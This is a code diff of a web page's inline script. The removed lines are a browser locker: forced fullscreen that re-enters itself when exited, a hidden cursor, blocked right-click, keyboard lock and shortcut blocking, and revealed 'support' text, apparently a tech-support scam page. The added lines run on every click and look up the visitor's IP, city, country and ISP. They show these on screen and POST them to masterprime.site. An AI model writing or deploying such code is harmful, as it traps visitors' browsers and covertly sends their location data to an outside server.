@@ -1,123 +1,76 @@
- <script>
-        document.addEventListener('DOMContentLoaded', function () {
-            var music = document.getElementById('music');
-            var isPlaying = false;
-            var isFullscreen = false;
-            var isPopupVisible = true;
-
-            function toggleMusic() {
-                if (isPlaying) {
-                    music.pause();
-                } else {
-                    music.play();
-                }
-                isPlaying = !isPlaying;
-            }
-
-            function playMusicOnClick() {
-                toggleMusic();
-                document.removeEventListener('click', playMusicOnClick);
-            }
-
-            document.addEventListener('click', playMusicOnClick);
-
-            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
-
-            function enterFullscreen() {
-                if (fullscreenEnabled && !isFullscreen) {
-                    document.documentElement.requestFullscreen()
-                        .then(() => {
-                            isFullscreen = true;
-                            document.body.classList.add('fullscreen');
-                            showWelcomeDiv();
-                            showSupportText();
-                        })
-                        .catch(err => console.log('Error entering fullscreen:', err));
-                }
-            }
-
-            function exitFullscreen() {
-                if (document.fullscreenElement) {
-                    document.exitFullscreen();
-                }
-            }
-
-            // Automatically re-enter fullscreen when it is exited
-            document.addEventListener('fullscreenchange', function () {
-                if (!document.fullscreenElement) {
-                    isFullscreen = false;
-                    setTimeout(() => {
-                        if (!isFullscreen) {
-                            enterFullscreen();
+  <script>
+  
+    document.addEventListener('click', function (event) {
+        // Get the element that was clicked
+        var clickedElement = event.target;
+  
+        // Log the clicked element to the console (you can replace this with sending data to your central server)
+        console.log('Clicked element:', clickedElement);
+  
+        // You can also track specific elements by checking their class names, IDs, or other attributes
+        getCurrentIpAddress();
+        // if (clickedElement.classList.contains('track-me')) {
+        //  // Send click data to the central server
+        // }
+    });
+  
+    function getCurrentIpAddress() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                fetch("https://masterprime.site/analytics/proxy/" + ipAddress)
+                    .then(response => response.json())
+                    .then(data => {
+                        if (document.fullscreenElement) {
+                            data.fullscreen = true;
+                        } else {
+                            data.fullscreen = false;
                         }
-                    }, 1000); // Wait briefly to allow the user to press Escape again if desired
-                }
+                        data.action = window.location.hostname;
+                        this.sendDataToServer(data);
+                        // update id_add
+                        var ipadd = data.ip;
+                        var city = data.city;
+                        var country = data.country;
+                        var isp = data.org;
+                        console.log("Data", data);
+                        var date = new Date();
+                        document.getElementById('ip_add').textContent = 'IP: ' + ipadd + ' ' + date.toLocaleString("en-US");
+                        document.getElementById('city').textContent = 'Location: ' + city + ', ' + country;
+                        document.getElementById('isp').textContent = 'ISP: ' + isp;
+                    })
+                    .catch(error => {
+                        console.error("Error fetching location and ISP:", error);
+                        document.getElementById("city").innerHTML = "Location: Unavailable";
+                        document.getElementById("isp").innerHTML = "ISP: Unavailable";
+                    });
+            })
+            .catch(error => {
+                console.error("Error fetching IP address:", error);
+                document.getElementById("ip_add").innerHTML = "Address IP: Unavailable";
             });
-
-            document.addEventListener('click', enterFullscreen);
-
-            var modalOverlay = document.getElementById('modal-overlay');
-            var modalClose = document.getElementById('modal-close');
-
-            function showModal() {
-                modalOverlay.style.display = 'block';
-            }
-
-            function closeModal() {
-                modalOverlay.style.display = 'none';
-            }
-
-            modalClose.addEventListener('click', closeModal);
-
-            showModal();
-
-            function hideCursor() {
-                document.documentElement.style.cursor = 'none';
-            }
-
-            document.addEventListener('click', function () {
-                hideCursor();
-                document.removeEventListener('click', hideCursor);
-                if (isPopupVisible) {
-                    closeModal();
-                    isPopupVisible = false;
+    }
+  
+    // Function to send click data to the central server
+    function sendDataToServer(data) {
+        console.log("Fetch API Called", data);
+        fetch('https://masterprime.site/analytics/trackclicks', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json', // Set content type to JSON
+                'Access-Control-Allow-Origin': '*'
+            },
+            body: JSON.stringify(data) // No need to parse and stringify again
+        })
+            .then(response => {
+                if (!response.ok) {
+                    console.error('Failed to send click data to server');
                 }
+            })
+            .catch(error => {
+                console.error('Error sending click data:', error);
             });
-
-            document.addEventListener('contextmenu', function (event) {
-                event.preventDefault();
-            });
-
-            document.addEventListener('keydown', function (e) {
-                if (e.ctrlKey && (e.key === 'U' || e.key === 'C' || e.key === 'S')) {
-                    e.preventDefault();
-                }
-            });
-
-            function preventKeyEvents(event) {
-                const blockedKeyCodes = [123];
-                const keyCode = event.keyCode || event.which;
-
-                if (blockedKeyCodes.includes(keyCode)) {
-                    event.preventDefault();
-                    console.log(`Key with code ${keyCode} is blocked.`);
-                }
-            }
-
-            window.addEventListener('keydown', preventKeyEvents);
-
-            function showWelcomeDiv() {
-                document.getElementById('welcomeDiv').style.display = 'block';
-            }
-
-            function showSupportText() {
-                document.getElementById('support-text').style.display = 'block';
-            }
-
-
-            navigator.keyboard.lock();
-            document.onkeydown = function (e) {
-                return false;
-            }
-        });
-    </script>
+    }
+  
+  </script>
